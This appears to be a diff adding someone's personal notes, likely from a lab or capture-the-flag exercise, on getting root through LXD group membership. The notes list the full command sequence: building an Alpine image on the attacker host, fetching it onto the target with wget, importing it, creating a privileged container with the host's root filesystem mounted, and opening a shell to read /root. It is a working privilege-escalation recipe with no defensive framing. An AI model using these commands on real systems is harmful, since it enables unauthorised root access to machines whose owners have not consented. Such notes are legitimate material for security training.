@@ -1,0 +1,19 @@
+- IT WORKED I GOT ROOT FROM LXD PRIV ESC
+	- from host machine used lxd alpine builder
+	- (in host) ran sudo ./build-alpine
+	- got a alpine tar file
+	- from target machine wget http://alpine.gz
+	- from there: lxc image import ./alpine(whole file) --alias myimage
+	- lxc image list (to verify it was there)
+	- lxc storage create pool dir
+	- lxc storage list (to verify it is there)
+	- lxc init myimage ignite -c security.privileged=true
+	- if the one above doesnt work lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+	- lxc profile device add default root disk path=/ pool=pool
+	- lxc profile device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+	- lxc start ignite
+	- lxc exec ignite /bin/sh
+	- whoami (should show root)
+	- cd /mnt/root
+	- cd root
+	- can now view the full root directory!!!!
